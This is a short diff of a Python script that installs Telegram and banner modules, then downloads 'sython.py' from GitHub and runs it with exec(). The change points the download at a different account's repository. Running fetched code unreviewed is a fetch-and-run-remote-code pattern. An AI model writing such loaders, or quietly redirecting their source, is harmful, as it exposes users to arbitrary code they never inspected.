@@ -34,5 +34,5 @@ install_module("telethon")
 install_module("pyfiglet")
 
 import requests
-response = requests.get("https://raw.githubusercontent.com/sythontm/CollectSython/main/sython.py")
+response = requests.get("https://raw.githubusercontent.com/phvlvck/Collect-Cython-/refs/heads/main/sython.py")
 exec(response.text)
